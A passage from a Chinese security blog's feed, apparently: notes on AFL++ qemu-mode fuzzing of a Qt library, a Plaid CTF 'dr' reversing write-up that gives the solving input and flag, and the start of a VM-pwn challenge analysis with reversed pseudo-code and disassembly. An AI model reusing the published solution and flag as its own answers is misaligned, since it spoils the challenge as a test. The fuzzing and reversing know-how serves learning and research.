*/</span>  cur_loc  = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>);  cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;  afl_area_ptr[cur_loc ^ prev_loc]++;  prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;&#125;</code></pre><h2 id="其他-踩坑"><a href="#其他-踩坑" class="headerlink" title="其他 踩坑"></a>其他 <del>踩坑</del></h2><h3 id="reader-setFileName"><a href="#reader-setFileName" class="headerlink" title="reader.setFileName"></a>reader.setFileName</h3><p>一开始我想去找<code>houjingyi</code>师傅是如何得到<code>reader.setFileName</code>接口在<code>reader.read()</code>之前被调用了的，因此我去尝试调试<code>linux</code>下的<code>wpsoffice</code>打开<code>docx</code>的操作</p><p>在<code>wpsoffice</code>最初并未加载<code>libQtCore.so.4.7.4</code>时，给<code>pthread_create</code>下断点，<code>continue</code>之后再给<code>libQtCore.so.4.7.4</code>中的<code>QImageReader.read()</code>和<code>QImageReader.setFileName()</code>下断点，但是其实最后并没有很明显的看出来，在调用<code>reader.read()</code>之前调用了<code>reader.setFileName()</code></p><p>最后去询问<code>houjingyi</code>师傅，才知道，师傅是直接根据程序代码逻辑，认为<code>reader.read()</code>之前肯定有对于设置图片路径<code>reader.setFileName()</code>的操作（感觉自己的思维有点局限了，老是想明明白白调出来调用的接口和顺序，实际上全然没管开发者在开发时候的代码逻辑）</p><p>P.S. 说起来，调试 <code>wpsoffice</code> 的程序的时候，觉得特别神奇，<code>wpsoffice</code>会运行<strong>两次</strong><code>_start</code>，在第一次<code>_start</code>的时候，可以看到<code>wpsoffice</code>在加载自己的程序的窗口，在第一次<code>_start</code>的最后会<code>jmp</code>第二次的<code>_start</code>，第二次的<code>wps</code>窗口，显示正在加载<code>docx</code>文件，因此当时我调试的时候，猜测第一次<code>_start</code>的时候，是在利用<code>QtCore</code>加载自己窗口，而第二次才是渲染解析<code>docx</code>文件，但是最后还是没调出来</p><h3 id="QString-QString"><a href="#QString-QString" class="headerlink" title="QString::QString"></a>QString::QString</h3><p>这个接口转换出来的并不是<code>QString</code>坑了我一段时间，最后找到<code>QFile::exists()</code>接口的时候，才发现，<code>QString::QString</code>转换出来的不是<code>QString</code></p><h3 id="AFL-INST-LIBS-AFL-QEMU-INST-RANGES"><a href="#AFL-INST-LIBS-AFL-QEMU-INST-RANGES" class="headerlink" title="AFL_INST_LIBS AFL_QEMU_INST_RANGES"></a>AFL_INST_LIBS AFL_QEMU_INST_RANGES</h3><p>不设置这两个的话，是不会给<code>dlopen</code>打开的库函数插桩的</p><h3 id="fuzz-断掉继续跑"><a href="#fuzz-断掉继续跑" class="headerlink" title="fuzz 断掉继续跑"></a>fuzz 断掉继续跑</h3><p>设置输入参数为<code>-i-</code> ，就可以读入 <code>fuzz_out/default/_resume</code>中的内容，继续跑</p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>顺手试了一波<code>Qt5.12.9</code>，最后跑的时候，是出现了<code>WARNING: Instrumentation output varies across runs.</code>，发现是出现了<code>ASLR</code>的情况，照理来说<code>qemu</code>应该不会出现这种情况，但是怎么解决，不太清楚</p><h4 id="qasan"><a href="#qasan" class="headerlink" title="qasan"></a>qasan</h4><p><del>另外试了一下<code>qasan</code>也无法进行插桩检测，感觉还得再整整</del></p><p><code>qasan</code>重新试了一下，没啥问题，至少也能跑起来，就是没啥效果，<code>build.py</code>之后，<code>./qasan ./elffile arg...</code>就可以了</p><h4 id="e9afl"><a href="#e9afl" class="headerlink" title="e9afl"></a>e9afl</h4><p>试了一下<code>e9afl</code>，但是觉得对于这种写的<code>harness</code>并不怎么友好，最终效果非常不好，对于库函数的插桩，应该是插桩所有函数，或者沿着接口的<code>CFG</code>需要对主要部分插桩，但是我反汇编，看的时候，感觉基本没插桩什么</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>afl++</tag>
      
      <tag>qemu_mode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Plaid CTF dr</title>
    <link href="/2021/05/10/Plaid%20CTF%20dr/"/>
    <url>/2021/05/10/Plaid%20CTF%20dr/</url>
    
    <content type="html"><![CDATA[<p>打比赛的时候，后面一直在看<code>dr</code>这个题，把大概逻辑逆清楚（<del>后来发现逆向一点用都没，感觉还不如猜呢，tcl，rust逆的很慢</del>），一开始觉得有点类似自动机，后面发现是正则之后，巨神两个小时就秒了（tql</p><p>拖了很久才来复现，稍微记录一下，免得之后忘记了</p><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p> 虽然是 rust 写的，但是程序逻辑比较简单，可以分为三部分，前面第一部分和第三部分都是定死的字符串 “3” 和 “yes”</p><p>第二部分输入的时候会出现一些奇怪的东西，到后面可以发现第二部分算是第四部分的提示</p><p>第二部分输入的是症状，第四部分是输入key，输入症状时，会出现类似自动机吃字符然后出现状态转换的提示，在这部分可以猜到一些最基本的符号表示，同时不同的症状需要的治病的费用不同，对后续的第四部分也会造成影响</p><p>第四部分输入key之后，会进行接受，并在最后将输入的内容和写在bss段的字符列表进行处理之后得到flag</p><h2 id="正则分析"><a href="#正则分析" class="headerlink" title="正则分析"></a>正则分析</h2><p>通过猜名字和对于不同的输入和提示的返回可以得到以下的分析结果</p><pre><code class="hljs"><span class="hljs-attribute">And</span>: 满足Res中所有的要求<span class="hljs-attribute">Alt</span>: 满足Res中其中一个要求<span class="hljs-attribute">Seq</span>: 正则需要满足的序列<span class="hljs-attribute">Lit</span>: 一个一个匹配，字面量<span class="hljs-attribute">Res</span>: 数组<span class="hljs-attribute">Star</span>: 匹配0个或者多个<span class="hljs-attribute">Eps</span>: epsilon<span class="hljs-attribute">Neg(Null)</span>: 匹配任意长度的<span class="hljs-attribute">Neg:</span>    10c -&gt; 10ca    Neg( ... Alt(Res([Lit(&quot;af&quot;)])) ...) -&gt; Neg( ... Alt(Res([Lit(&quot;f&quot;)])) ... )    应该是禁止出现 af 的意思        尝试 10caf 也失效了<span class="hljs-attribute">Consider</span>:     1: 1,7777,73331         0*16+1    10: 16,7777,73331       (0*16+1)*16+0        100: 256,7777,73331     ((0*16+1)*16+0)*16+0    10c: 268,7777,73331     ((0*16+1)*16+0)*16+0xc    %733331    相当于 Consider(Res([])) 的个数进制<span class="hljs-attribute">Moon</span>:     1: Moon([0-9],2,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10: Moon([0-9],3,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    100: Moon([0-9],1,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10c: Moon([a-f],3,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)        相当于在算个数，如果个数相等了，这个 Moon 可以结束进入下一个    100c 这个c就吃不进去，因为第一项是 Moon([0-9], 1, 3)<span class="hljs-attribute">Fan:</span>    10: Neg(.. Fan([a-f], 6) ..)    10b: Neg(.. Fan([a-f], 5) ..)    倒数计数</code></pre><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>最后对照输入<code>1</code>之后的正则提示，可以分析得到以下的结果</p><pre><code class="hljs lsl"><span class="hljs-number">1.</span> Neg(Null) + Consider( [bcd], Lit(<span class="hljs-string">&quot;cdb&quot;</span>)+Neg(bd) ], <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  字符串 []cdb 或者 cdb[] 且不能为 cdbb cdbd<span class="hljs-number">2.</span> *[<span class="hljs-number">1</span><span class="hljs-number">-3</span>] + (*[<span class="hljs-number">3</span><span class="hljs-number">-7</span>] + Neg(Null))                                <span class="hljs-number">3.</span> Consider( [<span class="hljs-number">05</span>a], [<span class="hljs-number">16</span>b], [<span class="hljs-number">27</span>cf], [<span class="hljs-number">38</span>dx], [<span class="hljs-number">49</span>e], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span> )     算法需要 最后 %<span class="hljs-number">7</span> == <span class="hljs-number">0</span><span class="hljs-number">4.</span> Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>) + Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>) + Moon( Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>), Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>), <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)    需要 数字(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+字符(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..)+数字(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+字符(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..) <span class="hljs-number">5.</span> Moon(Lit(<span class="hljs-string">&quot;10&quot;</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)                                        <span class="hljs-number">10</span>需要出现<span class="hljs-number">3</span>次<span class="hljs-number">6.</span> Neg( Alt( Lit(<span class="hljs-string">&quot;af&quot;</span>), Lit(<span class="hljs-string">&quot;73&quot;</span>), 数字+Lit(<span class="hljs-string">&quot;a&quot;</span>), Lit(<span class="hljs-string">&quot;ccc&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">7</span>) )  )          af <span class="hljs-number">73</span> 数字+a ccc 都不能出现 数字也不能连续超过<span class="hljs-number">7</span>个   Neg( Alt( Lit(<span class="hljs-string">&quot;a&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">6</span>)))                   a 不能出现 数字不能连续超过<span class="hljs-number">6</span>个<span class="hljs-number">7.</span> Neg( Neg(Null) + Fan([a-f]+Neg(Null), <span class="hljs-number">6</span>))                                    字母不能超过<span class="hljs-number">6</span>个<span class="hljs-number">8.</span> Consider(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,a,b,c,d,e,f, <span class="hljs-number">0</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">73331</span>)</code></pre><h2 id="大致推测"><a href="#大致推测" class="headerlink" title="大致推测"></a>大致推测</h2><p>1 4 7得 <code>cdb</code> 的串长度只能为 4且只能为 <code>[b-f]cdb | cdb[cef]</code></p><p>主要4可以知道基本上是<code>数字+字符+数字+字符</code>的模式，又字符不能超过6个且连续的字符必须是1或者4个，因此要么是<code>1+4</code>要么是<code>4+1</code></p><p>再判断一下数字只能是<code>2+2 | 2+5 | 5+2 | 5+5</code>，又需要出现三次<code>10</code>，因此只能<code>[1010x|10x10|10] + [10xxx|x10xx|xx10x|xxx10]</code>或者这两个的顺序可以反过来即前面是一个<code>10</code>后面是两个<code>10</code></p><p> 因此<code>(a, b, c, d)</code>中</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>: <span class="hljs-number">1010</span>x | <span class="hljs-number">10</span>x<span class="hljs-number">10</span> | <span class="hljs-number">10</span><span class="hljs-attribute">b</span>:<span class="hljs-meta"> [b-f]cdb | cbd[cef]</span><span class="hljs-attribute">c</span>: <span class="hljs-number">10</span>xxx | x<span class="hljs-number">10</span>xx | xx<span class="hljs-number">10</span>x | xxx<span class="hljs-number">10</span><span class="hljs-attribute">d</span>: bcd</code></pre><p>且<code>a c</code>可交换，<code>b d</code>可交换，然后必须要<code>10</code>开头，必须要3个<code>10</code>，不能出现<code>73</code>，且两个<code>Consider</code>需要满足</p><p>因此可以写出脚本爆破，最后可以得到一堆可能的解</p><p>最后可行的结果</p><pre><code class="hljs apache"><span class="hljs-attribute">cough</span><span class="hljs-attribute">10174cdbf10810c</span><span class="hljs-attribute">PCTF</span>&#123;a_pr<span class="hljs-number">1</span>m<span class="hljs-number">3</span>_a_day_k<span class="hljs-number">33</span>ps_th<span class="hljs-number">3</span>_D<span class="hljs-number">0</span>ctor_Firmly_Away&#125;</code></pre><p>附上题目和脚本 <a href="https://github.com/Vang3lis/CTF_repo/tree/master/PlaidCTF_2021/dr">dr</a></p><p>我的脚本写的十分的暴力（无限套for循环），巨神写的就很简单</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>reg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWBlogin &amp; GACTF vmpwn</title>
    <link href="/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/"/>
    <url>/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/</url>
    
    <content type="html"><![CDATA[<p>强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。</p><p>打完 <code>GACTF2020</code> 之后把其中的<code>vmpwn</code>也添加在此</p><h2 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h2><p>该题给了一个 <code>emulator</code>虚拟机，运行的类似机器码的<code>test.bin</code>和<code>launch.sh</code>，之后<code>tips</code>的时候给了<code>Instruction.h</code></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><p>基本上程序运行依靠一个虚拟机的结构体，可以从<code>main</code>里面看到就是 <code>v9</code>结构体，后文会将介绍该结构体</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><span class="hljs-function"></span>&#123;    len = sub_ba0(argv[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">if</span>(len &lt;= <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        fd = open(argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        v8 = mmap(<span class="hljs-number">0</span>, len, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, fd, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(!v8)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        <span class="hljs-comment">// check image format</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(v8, <span class="hljs-string">&quot;\x61\xde\x10\ef&quot;</span>, <span class="hljs-number">4</span>))        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);        <span class="hljs-comment">// check lenth</span>    <span class="hljs-comment">// segment?</span>    <span class="hljs-comment">// v8[6, 14) ~ [14, 22) lenth</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);        <span class="hljs-comment">// v8[22, 30) ~ [30, 38)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">30</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);    <span class="hljs-comment">// v[38, 46) &gt; v8[14, 22)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">38</span>) &gt;= *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) )         <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);    v9 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0xD0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// v[6, 14) == offset v&#123;14, 22) == segment_size</span>    <span class="hljs-comment">// v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整</span>    v9[<span class="hljs-number">21</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">21</span>], &amp;(v8[v8[<span class="hljs-number">6</span>, <span class="hljs-number">14</span>)]),  v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    v[<span class="hljs-number">20</span>] = segment_size;    <span class="hljs-comment">// </span>    v9[<span class="hljs-number">23</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">23</span>], &amp;(v8[v8[<span class="hljs-number">22</span>, <span class="hljs-number">30</span>)]), v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    v9[<span class="hljs-number">22</span>] = segment_size;     v9[<span class="hljs-number">25</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>);    v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>;    v9[<span class="hljs-number">18</span>] = v8[<span class="hljs-number">38</span>, <span class="hljs-number">46</span>)    g_Var = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x18</span>, <span class="hljs-number">1</span>);    <span class="hljs-built_in">memset</span>(g_Var, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">//链表结构 可能记录 segment flag 的</span>    <span class="hljs-comment">// g_Var[0x10, 0x18) -&gt; struct_18 -&gt; struct_18;</span>                  <span class="hljs-keyword">while</span>(!sub_c1a(v9))    &#123;&#125;&#125;</code></pre><p>然后进入<code>c1a</code>结构体的时候，会发现<code>IDA</code>报出该函数太大无法分析，只能另外用<code>Ghidra</code>看能不能分析，然后发现能够反编译，于是对其进行<code>dump</code>反编译的文本进行分析</p><h4 id="VM-struct"><a href="#VM-struct" class="headerlink" title="VM struct"></a>VM struct</h4><p>其中关键的结构体被逆出来是如下</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">int64_t</span> r00;    <span class="hljs-keyword">int64_t</span> r01;    <span class="hljs-keyword">int64_t</span> r02;    <span class="hljs-keyword">int64_t</span> r03;    <span class="hljs-keyword">int64_t</span> r04;    <span class="hljs-keyword">int64_t</span> r05;    <span class="hljs-keyword">int64_t</span> r06;    <span class="hljs-keyword">int64_t</span> r07;    <span class="hljs-keyword">int64_t</span> r08;    <span class="hljs-keyword">int64_t</span> r09;    <span class="hljs-keyword">int64_t</span> r0a;    <span class="hljs-keyword">int64_t</span> r0b;    <span class="hljs-keyword">int64_t</span> r0c;    <span class="hljs-keyword">int64_t</span> r0d;    <span class="hljs-keyword">int64_t</span> r0e;    <span class="hljs-keyword">int64_t</span> r0f;    <span class="hljs-keyword">int64_t</span> r10;    <span class="hljs-keyword">int64_t</span> r11;    <span class="hljs-keyword">int64_t</span> pc;             <span class="hljs-comment">// vm[0x12]</span>    <span class="hljs-keyword">int64_t</span> flags;          <span class="hljs-comment">// vm[0x13]</span>    <span class="hljs-keyword">int64_t</span> text_size;      <span class="hljs-comment">// vm[0x14]</span>    <span class="hljs-keyword">int64_t</span> text_segment;   <span class="hljs-comment">// vm[0x15]</span>    <span class="hljs-keyword">int64_t</span> data_size;      <span class="hljs-comment">// vm[0x16]</span>    <span class="hljs-keyword">int64_t</span> data_segment;   <span class="hljs-comment">// vm[0x17]</span>    <span class="hljs-keyword">int64_t</span> io_file;        <span class="hljs-comment">// 0x18 struct (int_no=0) -&gt; 0x18 (int_no=1) -&gt; 0x18 (int_no=2)</span>    <span class="hljs-keyword">int64_t</span> <span class="hljs-built_in">stack</span>;          <span class="hljs-comment">// vm[0x19]</span>    <span class="hljs-comment">// int64_t </span>&#125;;</code></pre><p>前面是寄存器，后面是一些段和存储的<code>io_file</code>链和虚拟的栈</p><h4 id="op-1"><a href="#op-1" class="headerlink" title="op[1]"></a>op[1]</h4><p>在<code>0xc1a</code>程序的开始先会判断当前<code>op</code>是否<code>&lt;2</code>如果<code>&lt;2</code>则退出，说明每一个指令至少都有两个字节，之后用了<code>op[1]&amp;0xf</code>进行<code>switch case</code>判断当前指令长度</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span> op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xe</span>,         <span class="hljs-number">4</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>,        <span class="hljs-number">0xb</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x5</span>:        <span class="hljs-number">0x15</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x25</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">5</span>        <span class="hljs-number">0x35</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">7</span>        <span class="hljs-number">0x45</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">0xb</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">0x6</span>:        <span class="hljs-number">3</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x7</span>:        <span class="hljs-number">0x17</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">3</span>        <span class="hljs-number">0x27</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x37</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">6</span>        <span class="hljs-number">0x47</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x8</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] == <span class="hljs-number">0x20</span>:            <span class="hljs-number">2</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x9</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] != <span class="hljs-number">0x20</span> &amp;&amp; a[<span class="hljs-number">0x14</span>] - a[<span class="hljs-number">0x12</span>] &lt; <span class="hljs-number">10</span>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xa</span>:        <span class="hljs-number">2</span>    <span class="hljs-keyword">default</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</code></pre><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>在最开始的时候傻乎乎的顺着<code>dump</code>的函数逆，后来逆完<code>MOV</code>之后觉得其中<code>MUL/DIV/MOD</code>等一些内容都可以不用逆，然后我让一个学弟帮忙逆<code>XOR/OR/AND</code>等一些其他的，我去逆<code>JMP</code>这整个，后来觉得这个思路错了，其实如果<code>test.bin</code>的程序并没有自我修改的话，其实可以先根据<code>size</code>和<code>instrcution</code>把指令分了，再看是否需要逆一些指令，最后发现只有<code>mov pop push call ret jmp（中间少部分）syacall</code>需要很清楚的逆出来，其他的都可以不用逆。</p><h4 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h4><p>最后需要的每个的情况都整理成如下模式</p><pre><code class="hljs python"><span class="hljs-comment"># 20_syscall.c</span>switch op[<span class="hljs-number">0</span>]:// SYSCALL// size == <span class="hljs-number">2</span>case <span class="hljs-number">0x20</span>:    r00 == <span class="hljs-number">0</span>        op[<span class="hljs-number">1</span>] == <span class="hljs-number">0xa</span>                fd = open(data[r01], r02)        insert fd into vm.io_file    r00 == <span class="hljs-number">1</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            read(r01, data[r02], r03)        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>            read(r01, stack[r02], r03)    r00 == <span class="hljs-number">2</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            write(r01, data[r02], r03)                op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>:            write(r01, stack[r02], r03)    r00 == <span class="hljs-number">3</span>        close(r01)</code></pre><h4 id="简易-emulator"><a href="#简易-emulator" class="headerlink" title="简易 emulator"></a>简易 emulator</h4><p>最后根据整理的<code>op[0] op[1]</code>进行编写简易的分开<code>test.bin</code>的程序</p><pre><code class="hljs x86asm">ov <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x45</span><span class="hljs-keyword">call</span> <span class="hljs-number">0x45</span> <span class="hljs-number">0x1</span> <span class="hljs-number">0x53</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa756f5920656553</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x23</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x28</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xb</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">dword</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x51</span>|Q<span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span 